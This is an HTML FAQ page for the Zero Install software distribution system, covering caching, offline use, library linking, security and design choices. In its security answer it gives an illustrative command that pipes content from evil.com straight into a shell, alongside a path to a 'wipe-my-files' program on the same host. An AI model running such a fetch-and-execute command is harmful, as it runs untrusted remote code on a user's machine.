<?xml version='1.0' encoding='utf-8'?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<h2>FAQ</h2>

<toc/>

<h3>I haven't tried it yet, but it sounds really complicated</h3>
<p>It isn't. Try it. Now.</p>

<h3>How do I provide software using Zero Install?</h3>
<p>You need to create some index files using the 0build script, and then
upload them to a web server. See <i><a href="packagers.html">Documentation
for packagers</a></i> for more information.
</p>

<h3>Isn't fetching stuff over the web really slow?</h3>
<p>You have to get stuff over the web anyway the first time. The
system caches everything, and will never even check that the cache is
up-to-date if it can satisfy a request without updating.
</p><p>
There is no speed hit to using stuff once it's downloaded.
The fact that everything is referenced by fixed URIs instead of
having to search means that this system can actually be faster in some
cases. Consider loading a shared library. At the moment, a program
must, on startup:
</p>
<ol>
 <li>Load /etc/ld.so.cache and find the full path of each library from
that.</li>
 <li>Load the actual library by its path.</li>
</ol>

<p>With Zero-installation, this becomes:</p>

<ol>
 <li>Load the actual library by its path.</li>
</ol>
<p>
It also removes the need to run ldconfig at install time (handy,
since there is no 'install time' ;-), losing a major source of errors
and user confusion.
</p>
<p>
As far as network bandwidth goes, the worst-case situation is that you
downloaded the entire archive, which is what you'd have had to do
anyway. However, by default each directory is downloaded on demand. Thus,
if you want to run a ROX-Lib2 application like Memo, but you don't
want to read the ROX-Lib2 developer reference documentation then it
doesn't get downloaded (until you try to access it).
</p>

<h3>What about people without Internet connections?</h3>
<p>You can still install from CD. Either install an application in the
normal AppDir fashion (ie, by dragging to your home directory), or by
providing a web-cache on the CD and merging it with the master one (we
could provide software to do this easily).
</p>

<h3>This is just a network filesystem, isn't it?</h3>
<p>Yes. It uses HTTP to fetch a small index archive, and can then use any
other system (HTTP, FTP or various peer-to-peer and mirroring systems) to
fetch the actual data (see the <a href="technical.html">technical details</a>
page for more information).
This means that providing software though Zero Install is easy, because pretty
much everyone can put stuff on a webserver, whereas it's often hard to find
someone who will host other types of server.
</p>

<p>The main difference between this and standard shares is the way the
paths use the Internet DNS system. This allows us to link to resources
by fixed paths, in the same way that I can put up a link to
<a href="http://rox.sourceforge.net">ROX</a> on this web page without
worrying about where the user has 'installed' the web page.
</p>

<h3>Isn't is really hard to find applications if you always have to
type URIs for them?</h3>
<p>Yes. As with the web, that works but it's not the intended way to
do it. Like the web, you have links to the URIs, and you use the links
normally.</p>
<p>
For example, having opened the ROX-Filer directory showing Memo in
<a href="install.html">the installation instructions</a>, you can drag Memo
from the window onto your panel. Now you access it by clicking on its panel
icon; no URIs.
</p><p>
You could also put it on the pinboard, bookmark the directory, set
a keyboard shortcut, or whatever. Web pages can provide the
URIs in a clickable form (so clicking on a link opens the filer
window). A 'distribution' could be nothing more than a web page
listing links to high quality software for a particular audience.
</p><p>
Finally, if you want to get a newer version, or find related software,
traditional systems mean you have to try and remember where you got it
from, or hunt through the documentation. With the URI scheme, just
choose 'Show Location' from the panel menu and the directory
containing Memo (on the remote server) will be opened.
</p>

<h3>What about dial-up users? They don't want on-demand loading when
they're off-line.</h3>

<p>Various levels of granularity can be used. A user could tell the
system to cache an entire application, for example. Of course, dial-up
users might also appreciate that they have to download a lot less
stuff in total. A user with a slow, but easy to start, Internet
connection will probably prefer this scheme. A user who wants to take
their laptop up a mountain, however, would probably want to get as
much software as possible first.
</p><p>
However, knowing
how much to download requires knowing what software the user may want
to run in the future. Even the user doesn't know that. It's not a new
problem. No modern system is 'closed'. There will always be an
application that says "This program works well with 'foo'. You can get
it from this web site...". Should installing the program also install
'foo'? Should installing ROX-Lib also install the README? The
developer documentation? The python tutorial at python.org?
</p>

<h3>I understand that when I browse the web my computer caches the
pages, images and stylesheets automatically so I don't need to
manually 'install' multiple PNG images to see a page, but software is
different!</h3>
<p>Why?</p>

<h3>Isn't this like Windows Update?</h3>
<p>From what I've heard, that's something completely different. That
tells you when something needs upgrading (which this scheme doesn't
do) and then does a traditional download-unpack-setup.</p>

<h3>What about when resources move?</h3>
<p>Everything you've already accessed at least once will continue to
work. Users trying software for the first time will find that it
doesn't work due to broken links. This is not new, either. The download
instructions for ROX-Filer tell users that they need to get GTK from
www.gtk.org and libxml from www.xmlsoft.org. If those sites change
their names, the download instructions will be broken. It really
doesn't make any
difference.
</p><p>
As with the regular web, people can leave redirections to the new
site. The system administrator can also specify a list of redirections
manually if required (this also allows all access to a particular
library to use a modified version, for example). See the
<a href="docs.html">documentation page</a> for details of the 0divert
command.
</p>

<h3>How secure is this?</h3>
<p>About as secure as any system which ultimately involves running
software written by people you don't know who live in far away
countries. However, since the downloading is automatic, there are more
chances for automatic checking (eg, verifying GPG signatures, etc).
</p>
<p>
To be more precise, it has all the advantages of application
directories (no install step, so no chance for anything to run as
root). In addition, if two users try to run the same application, they
both automatically get the same cached copy, whereas without this each
would have to install a separate copy to their home directory, or one
user has to trust the other user not to have modified his copy, and
use that.
</p>
<p>
See the <a href="security.html">security issues</a> document for
more information.
</p>

<h3>How do you do integration (eg, making a Start menu show all
installed software)?</h3>

<p>Since there is no concept of software being 'installed' or
'not-installed', this is not required. The menu (or other launching
device) simply shows applications that the user may want to run. They
will be fetched on demand.</p>
<p>For example, the set of applications your system shows you on first
install is the applications the distribution author thinks you might
like. They may be already in the cache, or they may be loaded on
demand (depending on the distribution's installer).
</p>
<p>Indeed, the question is backwards. The menu doesn't show installed
software; rather, the 'installed' software is what the user has put on
the menu.
</p>

<h3>What if something gets automatically removed from the cache while
I'm up a mountain with my laptop?</h3>
<p>Currently, nothing is ever automatically removed from the cache.
Users can choose the purging scheme that suits them. For users with
broadband, that might mean removing anything that hasn't been accessed
for a year. For users with dial-up and 80Gb disks, that probably means
never ever removing anything.
</p><p>
You can run <b>/uri/0install/zero-install.sourceforge.net/apps/ZeroClean</b>
to scan the cache for good removal candidates:
</p>

<p style='text-align: center'>
<img width="618" height="338" src="ZeroClean.png"
     alt='ZeroClean find somes files to remove' />
</p>

<h3>Why are you abandoning application directories after supporting
them all these years?</h3>
<p>I'm not. The examples use
<a href="http://rox.sourceforge.net/phpwiki/index.php/AppDir">ROX application
directories</a>. Application directories provide an ideal user interface for
this system, since they don't all have to be installed in a single directory
(in PATH, etc). However, the system can be used for software not packaged as
ROX-style applications too (libraries, in particular, require few changes).
</p>

<h3>How do I link against a library such that when it's upgraded I get
the new version automatically?</h3>

<p>Link against .../libfoo/latest-1.2.x. This is a symlink to, eg
libfoo/1.2.3. If the user enters the 'libfoo' directory and does a
refresh, the link will now point to 1.2.4 and that will be fetched on
demand.</p>
<p>
If a program relies on a bug fix in libfoo-1.2.6 then it can check that
>'latest-1.2.x' points to that version or later, and force a refresh if
not.
</p>

<h3>Is Linux binary compatibility good enough to share binaries between
distributions?</h3>
<p>
There are some problems in this area generally (not just with Zero Install).
The <a href="http://www.autopackage.org">Autopackage</a> project is working
on these issues; see their FAQ for a detailed look at the problems faced.
However, we have a single binary for ROX-Filer that seems to work on all
distributions, so it's certainly possible.
</p>

<h3>What happens if there are two programs which may not be run simultaneously
for some reason?</h3>
<p>
Running and installing are separate. In Debian, for example, installing some
software (eg, exim) may also cause it to run, but in zero install there is no
install step, only the running step. So, you can 'install' any number of
conflicting packages, but you can still only run one mail system at once.
</p>

<h3>Why did you write a new kernel module? What's wrong with CODA, UserVFS, etc?</h3>

<p>
Fully user-space filesystems are really, really slow. Fine for accessing a
remote FTP site, but you wouldn't want to run all your applications that way.
Every file read involves a context switch to another process and back!
</p>

<p>
CODA is better (and was used for prototyping), but it's still slower than
lazyfs (double context switch on every open/close) and buggy. Also, if
the user-space helper crashes, all your applications stop working and you
probably have to reboot. If the user-space helper in Zero Install crashes,
you just can't download any new stuff until you restart it, but everything
else continues to work.
</p>

<h3>Upstream authors can't be trusted to provide decent quality software!</h3>

<p>
Traditionally, a lot of the QA work that goes on in open source software is done
by distributions (such as Debian). They take the `upstream' code from the software
authors, and then provide a packaged version to their users. There are then two classes
of bugs to worry about: upstream bugs and packaging bugs. Since it's not usually clear
to users which bugs are in which category, they tend to report all bugs to the packagers,
who often then fix even upstream bugs in their own packages.
</p>

<p>
The effect of this is that distribution-provided packages are often more reliable than
upstream ones (since upstream don't get to hear about many of the bugs), and different
distributions have fixed different bugs, with no coordination between them. With Zero
Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp
bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes
would benefit everyone, not just Debian users.
</p>

<p>
Of course, the other reason why packages may be different to the upstream versions is
because upstream is slow to respond, uninterested or known to be careless about quality.
In this case, a Zero Install packager can provide a fixed version from their own site
and get other people to link to that. The advantage here is that, again, everyone benefits
(anyone can choose to run <tt>/uri/0install/debian.org/gimp.org/gimp</tt> instead of
<tt>/uri/0install/gimp.org/gimp</tt> if they want, not just Debian users).
</p>

<h3>Doesn't Zero Install make it easier to send users malicious software?</h3>

<p>
Not really. True, you could email a user, telling them to run:
</p>
<pre>
$ /uri/0install/evil.com/wipe-my-files
</pre>
<p>
But on the other hand, you could also send them an email telling them to type:
</p>
<pre>
$ lynx -source http://evil.com | sh -
</pre>
<p>
Both can do exactly the same amount of damage, but the second works on any
system. Zero Install helps with large, complicated programs with lots of
dependencies, whereas your typical malicious program is only a few lines long,
and doesn't benefit from it.
</p>

<h3>But what about kernel bugs? Zero Install is still vulnerable then!</h3>

<p>
Recently, a bug was found (and fixed) in the Linux kernel that allowed any user
to become root. Most famously, it was used to compromise some of Debian's
servers. Couldn't a user access some software through Zero Install that
took advantage of this bug to break an un-patched machine?
</p>

<p>
Well, yes. But, as with the question above, they could do it just as easily
without Zero Install (using wget, or just by typing the program in themselves).
If your kernel is insecure, you have a problem with or without Zero Install.
</p>

<h3>Why is it written in C?</h3>

<p>
Actually, this isn't a FAQ, but it should be. Zero Install itself is fairly
security-critical (it doesn't run as root or accept incoming connections, but
an exploit would allow a local attacker to trojan other users' software). It
isn't speed critical, however; it only gets invoked when something isn't in the
cache, in which case it has to do a network fetch anyway. Given C's lack of
buffer-overflow checking, it seems a poor choice of language.
</p>

<p>
I actually looked at quite a few languages. The problem is that I wanted
it to be runnable from a boot floppy, which means the binary has to be
<i>small</i>. And, incredibly, there seems to be no decent language capable
of producing small stand-alone binaries. I thought C was bloated when I
couldn't get "Hello World" under about 700 bytes (and the naive implementation
is closer to 3K), but most languages can't seem to manage under a meg for
the same thing. Python's great, of course, but it needs a huge runtime
(likewise for Java, etc). The best language I could see for this was the
<a href="http://www.digitalmars.com/d/index.html">D Programming Language</a>
(which still manages a ridiculous 60K for a program that does nothing), but
expecting people to install a D compiler isn't going to help adoption, and it's
not portable (or rather, D code is, but the compiler isn't yet).
</p>

<p>
The solution may be to have two implementations of zero-install; one written
in C to be small for boot-strapping, and one written in
Python/D/scheme/whatever for larger systems.
</p>

<h3>Does this replace /etc, /var, /tmp, etc?</h3>

<p>
No. Zero Install is read-only, so you couldn't store configuration, data or temporary
files in it, even if you wanted to. <b>/usr/0install</b> replaces <b>/usr</b> and <b>/opt</b>.
It's sensible to keep the other things separate, because they need to be treated
differently:
</p>

<dl>
<dt>/uri/0install</dt>
<dd>Read-only files that can be downloaded again automatically if lost. Does
not need to be backed up (cache stored under <b>/var</b>).</dd>

<dt>/etc</dt>
<dd>Contains system configuration. Should be backed up, and probably kept under version
control too. May be mounted read-only most of the time.</dd>

<dt>/home</dt>
<dd>User data. Must be writeable, and often changes. Should be backed up regularly.</dd>

<dt>/var</dt>
<dd>Changes quickly (contains print and mail queues, logs, etc). Must be writeable. Doesn't
need to be backed up, but data should persist over reboots.</dd>

<dt>/tmp</dt>
<dd>Changes quickly and must be writeable, but need not persist over reboots (can use
tmpfs rather than a physical disk).</dd>
</dl>

<h3>What was the inspiration for Zero Install?</h3>

<p>
Several things. <a href="http://www.coda.cs.cmu.edu/">CODA</a> and
<a href="http://www.gedanken.demon.co.uk/wwwoffle/">wwwoffle</a>
for showing that caching network filesystems can still work when
off-line. <a href="http://w3.org">The W3C</a> for using URIs for namespaces.
Not <a href="http://java.sun.com/products/javawebstart/">Java Web Start</a>
or <a href="http://cr.yp.to/slashpackage.html">D. J. Bernstein's
slashpackage</a> though, because I had never heard of them when I started the
project.</p>

</html>
